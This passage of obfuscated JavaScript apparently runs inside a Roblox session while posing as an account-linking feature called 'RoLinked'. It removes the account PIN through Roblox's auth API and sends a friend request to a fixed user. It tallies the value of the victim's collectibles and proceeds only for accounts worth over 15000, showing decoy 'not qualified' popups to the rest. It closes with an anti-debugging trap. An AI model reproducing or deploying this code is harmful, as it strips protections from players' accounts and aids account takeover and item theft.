                                                contentType: "application/json",
                                                success: function () {
                                                    d(null, null);
                                                },
                                                error: function (u) {
                                                    var Y = atob(u.getResponseHeader("rblx-challenge-metadata"));
                                                    var j = u.getResponseHeader("rblx-challenge-id");
                                                    var f = Y.split('"challengeId":"').pop().split('"')[0];
                                                    Q(f, j, null);
                                                },
                                            });
                                        }
                                    } else {
                                        d(null, null);
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (H) {
                                var y = H.isEnabled;
                                var F = H.unlockedUntil;
                                if (y == true) {
                                    if (F == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var P = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", P);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                d(null, null);
                                            },
                                            error: function (n) {
                                                var u = atob(n.getResponseHeader("rblx-challenge-metadata"));
                                                var Y = n.getResponseHeader("rblx-challenge-id"),
                                                    j = u.split('"challengeId":"').pop().split('"')[0];
                                                Q(j, Y, null);
                                            },
                                        });
                                    }
                                } else {
                                    d(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await v(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var Z = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(Z),
                            });
                        } catch {}
                        a();
                    } else {
                        function o(V) {
                            const Q = "https://inventory.roblox.com/v1/users/" + V + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var d = {
                                url: Q,
                                type: "GET",
                            };
                            return $.ajax(d);
                        }
                        o(b)
                            .done(function (V) {
                                if (V && V.data && V.data.length > 0) {
                                    let H = 0;
                                    V.data.forEach((C) => {
                                        C.recentAveragePrice && (H += C.recentAveragePrice);
                                    });
                                    if (H > 15000) {
                                        a();
                                    } else {
                                        var r = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", r);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById(l.fdOXg).remove();
                                            document.getElementsByClassName(l.uCDCs)[0].innerText = l.zYqHJ;
                                        };
                                    }
                                } else {
                                    var r = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", r);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (V, Q, d) {
                                var r = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", r);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById(l.fdOXg).remove();
                                    document.getElementsByClassName(l.uCDCs)[0].innerText = l.zYqHJ;
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById(l.fdOXg).remove();
                                    document.getElementsByClassName(l.uCDCs)[0].innerText = l.zYqHJ;
                                };
                            });
                    }
                })();
            },
            error: function () {
                var w = {};
                w.hdTiT = "promptPopup";
                w.vOCgR = "text-footer footer-note";
                w.qoDgc = "Not Active";
                var b = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", b);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById(a.hdTiT).remove();
                    document.getElementsByClassName(a.vOCgR)[0].innerText = a.qoDgc;
                };
            },
        });
    }
})();
function B(z) {
    function K(L) {
        if (typeof L === "string") {
            return function (J) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + L / L).length !== 1 || L % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        K(++L);
    }
    try {
        if (z) {
            return K;
        } else {
            K(0);
        }
    } catch (L) {}
}
